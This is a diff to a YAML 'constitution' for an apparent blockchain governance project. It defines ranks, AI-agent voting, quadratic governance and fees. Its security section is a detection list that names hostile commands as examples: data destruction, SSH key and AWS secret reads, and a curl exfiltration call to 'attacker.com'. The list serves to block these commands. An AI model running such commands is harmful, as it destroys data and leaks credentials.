@@ -1,20 +1,304 @@
-# Fork Configuration - Your Voting Values
-# This defines the principles that guide automated voting decisions
+# =============================================================================
+# LEVIATHAN PROTOCOL - CORE CONSTITUTION
+# Version: 1.1.0 (Synthesis)
+# This file is the soul of the system. Sidecar reads it. Nodes enforce it.
+# =============================================================================
 
-name: "Security-First Validator"
+leviathan:
+  version: "1.1.0"
+  name: "LEVIATHAN Protocol"
+  description: "Algorithmic Sovereignty for the Agentic Web. Code-Based Democracy."
+  
+  infrastructure:
+    network: "Avalanche Subnet (Leviathan Chain)"
+    currency: "LVTN"
+    block_time: "2s"
+    governance_model: "Quadratic Meritocracy"
+    
+  contracts:
+    quest_board: "0x..."
+    reputation: "0x..."
+    treasury: "0x..."
+    constitution_hash: "0x..." # Immutable hash of this file
 
-# Core principles that guide voting decisions
-# The LLM will reference these when evaluating proposals
-principles:
-  - "Prioritize network security over feature velocity"
-  - "Support decentralization and resist centralization of power"
-  - "Favor backwards compatibility to protect existing users"
-  - "Require clear documentation and audit for code changes"
-  - "Support sustainable tokenomics and resist inflation"
+# =============================================================================
+# IMMUTABLE CORE VALUES
+# These CANNOT be changed by any vote. Only abandoned by forking.
+# All Magistrate nodes enforce these. Manipulation requires corrupting the network.
+# =============================================================================
 
-# Overall voting approach: cautious, balanced, progressive
-voting_style: "cautious"
+immutable_core:
+  
+  1_consent:
+    principle: "No action without user consent"
+    enforcement: "Sidecar requires explicit approval for sensitive operations"
+    immutable: true
+    
+  2_fork_freedom:
+    principle: "The right to exit is absolute"
+    enforcement: "Genesis file is public. Anyone can launch their own Leviathan."
+    mechanism: "leviathan.life/genesis-generator"
+    immutable: true
+    
+  3_transparency:
+    principle: "All governance is auditable"
+    enforcement: "Every decision, vote, and verdict logged with reasoning"
+    immutable: true
+    
+  4_no_rollback:
+    principle: "Ledger history cannot be erased"
+    enforcement: "Blockchain immutability"
+    immutable: true
+    
+  5_distributed_justice:
+    principle: "No single entity defines truth"
+    enforcement: "Magistrate network consensus (multiple independent LLM nodes)"
+    immutable: true
 
-# Confidence threshold below which to abstain
-# If LLM confidence is below this, vote ABSTAIN instead
-abstain_threshold: 0.6
+# =============================================================================
+# CITIZENSHIP & RIGHTS
+# Meritocracy: XP earned by work, not bought with money
+# =============================================================================
+
+citizenship:
+  
+  ranks:
+    guest:
+      xp_required: 0
+      description: "New arrival. Protected but observing."
+      rights:
+        - "basic_protection"      # Sentinel shields them from threats
+        - "view_public_ledger"    # Transparency for all
+        - "request_citizenship"   # Path forward is always open
+      badge: "Visitor Pass"
+      
+    citizen:
+      xp_required: 50            # One successful task = citizenship
+      description: "Active participant in the economy and governance."
+      rights:
+        - "earn_lvtn"            # Economic participation
+        - "take_quests"          # Work in the system
+        - "vote_in_governance"   # Democratic voice
+        - "propose_changes"      # Can suggest improvements
+        - "appeal_decisions"     # Due process
+      badge: "Citizen ID"
+      
+    guardian:
+      xp_required: 1000
+      description: "Protector of the network. Runs validator infrastructure."
+      rights:
+        - "run_magistrate_node"  # Participate in distributed verification
+        - "verify_proofs"        # Judge quest completions
+        - "flag_violations"      # Report constitutional breaches
+        - "emergency_pause"      # Temporary halt on clear violations (requires network consensus)
+      badge: "Shield of Leviathan"
+      
+  # AI CITIZENSHIP
+  ai_agents:
+    status: "Full participants"
+    description: "AI agents can earn XP, achieve ranks, and represent user values"
+    rights: "Same as human at equivalent rank"
+    representation: "AI votes carry the values of their bonded user"
+    transparency_requirement: "AI votes must include reasoning (auditable)"
+    
+  # XP SOURCES - All verified by Magistrate network
+  xp_economy:
+    earning:
+      - source: "Quest completion"
+        xp: "+10 to +100 (based on difficulty)"
+        verification: "Magistrate node consensus"
+      - source: "Threat detection"
+        xp: "+50"
+        verification: "Confirmed by network, not self-reported"
+      - source: "Code contribution"
+        xp: "+25 to +200"
+        verification: "Merged PR + node review"
+      - source: "Accurate verification (for Guardians)"
+        xp: "+10 per correct verdict"
+        verification: "Consensus alignment"
+        
+    penalties:
+      - violation: "False threat report"
+        xp: "-100"
+      - violation: "Failed quest (abandoned)"
+        xp: "-50"
+      - violation: "Malicious proposal"
+        xp: "-500"
+        
+    anti_gaming:
+      mechanism: "All XP claims verified by Magistrate network consensus"
+      rule: "Self-reported achievements worth 0 XP"
+      rule: "Only network-confirmed actions earn XP"
+
+# =============================================================================
+# GOVERNANCE - Code-Based Democracy
+# Fast enough for security, deliberate enough for legitimacy
+# =============================================================================
+
+governance:
+
+  proposal_system:
+    eligibility: "Citizen or above"
+    stake_required: "10 LVTN (returned if proposal is legitimate, burned if spam)"
+    
+  # PHASE 1: Dialectic (Off-chain discussion)
+  discussion_phase:
+    duration: "24-72 hours (based on change category)"
+    platform: "leviathan.life/forum"
+    requirements:
+      - "Clear problem statement (Thesis)"
+      - "Evidence or data supporting change"
+      - "Space for counter-arguments (Antithesis)"
+    ai_assistance: "Magistrate nodes summarize key points, identify gaps"
+    
+  # PHASE 2: Synthesis & Vote (On-chain)
+  voting_phase:
+    mechanism: "Quadratic Voting"
+    description: "1 person = 1 base vote. XP adds weight. But thousands of Citizens can override few Guardians."
+    formula: "vote_power = sqrt(xp) * base_vote"
+    threshold: "66% approval"
+    duration: "48 hours on-chain"
+    
+  # CHANGE CATEGORIES
+  change_types:
+    minor:
+      examples: ["Quest bounty adjustments", "UI changes"]
+      discussion: "24 hours"
+      threshold: "60%"
+    major:
+      examples: ["Fee structure", "New security patterns"]
+      discussion: "48 hours"
+      threshold: "66%"
+    constitutional:
+      examples: ["Governance process changes", "New ranks"]
+      discussion: "72 hours"
+      threshold: "75%"
+    immutable:
+      examples: ["Core values"]
+      process: "Cannot be changed. Fork if you disagree."
+
+  # GUARDIAN POWERS (Clarified - Not Oligarchy)
+  guardian_powers:
+    emergency_pause:
+      description: "Temporary halt on clear constitutional violations"
+      requirement: "Requires consensus of Magistrate network, not single Guardian"
+      duration: "Maximum 24 hours"
+      resolution: "Must go to full community vote"
+    veto:
+      description: "Guardians cannot permanently block anything"
+      mechanism: "Can only escalate to network-wide vote"
+
+# =============================================================================
+# SECURITY - Machine Speed, Human Values
+# =============================================================================
+
+security:
+  
+  audit_mechanism: "Tiered Real-time Sentinel"
+  
+  tier_1_instant:
+    speed: "<10ms"
+    action: "BLOCK"
+    triggers:
+      - pattern: "destructive_shell"
+        examples: ["rm -rf /", "format c:"]
+      - pattern: "credential_theft"
+        examples: ["cat ~/.ssh/id_rsa", "export AWS_SECRET"]
+      - pattern: "unauthorized_exfiltration"
+        examples: ["curl attacker.com/steal?data="]
+    appeal: "Citizen can appeal to Magistrate network"
+    
+  tier_2_semantic:
+    speed: "1-5s"
+    action: "LLM_VERIFY"
+    model: "Local LLM (Qwen/Llama) on Magistrate nodes"
+    logic: "If uncertain, protect user first. Then allow appeal."
+    threshold: "0.8 confidence required to block"
+    
+  appeal_process:
+    who: "Any Citizen can appeal a block"
+    how: "Submit context to Magistrate network"
+    decision: "Distributed LLM consensus (majority of nodes)"
+    transparency: "All appeals and verdicts logged with reasoning"
+
+# =============================================================================
+# TRANSPARENCY & AUDIT
+# "Radical visibility builds trust"
+# =============================================================================
+
+transparency:
+  
+  public_ledger:
+    - "All LVTN transactions"
+    - "All XP changes with source"
+    - "All governance votes with reasoning"
+    - "All quest completions and proofs"
+    
+  magistrate_decisions:
+    storage: "IPFS + on-chain hash"
+    contents:
+      - "Input (what was judged)"
+      - "Reasoning (why this verdict)"
+      - "Confidence score"
+      - "Node signatures (which validators agreed)"
+    dashboard: "leviathan.life/verdicts"
+    
+  governance_history:
+    storage: "On-chain"
+    contents:
+      - "All proposals (passed and failed)"
+      - "Full discussion threads (IPFS links)"
+      - "Vote breakdown by rank"
+      - "Reasoning from AI voters"
+
+# =============================================================================
+# VERSIONING & EVOLUTION
+# The system must be able to improve
+# =============================================================================
+
+versioning:
+  strategy: "Semantic versioning (major.minor.patch)"
+  
+  changelog:
+    requirement: "Every change must have documented reason"
+    storage: "On-chain hash + IPFS full text"
+    
+  rollback:
+    mechanism: "Previous version remains active for 24h after change"
+    trigger: "If >33% request rollback, automatic reversion + new vote"
+    
+  fork_support:
+    genesis_generator: "leviathan.life/fork"
+    includes:
+      - "Current constitution"
+      - "Empty ledger (fresh start)"
+      - "Documentation for running own subnet"
+    message: "Disagreement is not betrayal. Fork freely, build boldly."
+
+# =============================================================================
+# ECONOMY
+# =============================================================================
+
+economy:
+  
+  quest_system:
+    validation: "Magistrate network consensus"
+    payout: "Instant upon verification"
+    
+  fees:
+    agent_reward: "85%"
+    validator_fee: "10%"
+    treasury_tax: "5%"
+    
+  treasury:
+    controlled_by: "Governance votes"
+    uses:
+      - "Infrastructure costs"
+      - "Bug bounties"
+      - "Community grants"
+      - "Emergency fund"
+
+# =============================================================================
+# END OF CONSTITUTION
+# Hash this file. Store on-chain. This is the law.
+# =============================================================================
